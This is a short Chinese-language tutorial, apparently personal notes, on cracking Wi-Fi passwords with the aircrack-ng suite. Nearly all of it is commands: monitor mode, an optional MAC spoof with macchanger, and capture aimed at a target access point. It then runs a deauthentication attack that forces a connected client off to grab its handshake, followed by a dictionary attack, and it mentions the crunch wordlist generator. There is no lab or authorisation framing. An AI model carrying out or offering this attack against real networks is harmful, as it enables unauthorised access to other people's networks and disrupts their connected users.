使用apt-get 安装即可
具体使用步骤：
1.启动airmon-ng查看网络接口
-- sudo airmon-ng
2.修改接口的mac地址（借助macchanger，此步骤可选）
-- sudo airmon-ng stop 接口名
-- sudo macchanger --mac 随机列举的mac号码
-- sudo airmon-ng start 接口号
3.扫描wlan
-- sudo airodump-ng 接口名
4.接收指定BSSID的文件
-- sudo airodump-ng -c 目标频道 -w 数据保存的名字 --bssid 目标AP的bssid 接口号的映射端口
5.进行deauth攻击以便捕获握手包
-- sudo aireplay-ng --deauth 10 -a 目标AP的bssid 	-c 单个连接目标的mac号码 接口号的映射端口
6.字典攻击
-- sudo aircrack-ng -w 字典路径 截获的数据文件名-01.cap


crunch字典生成工具
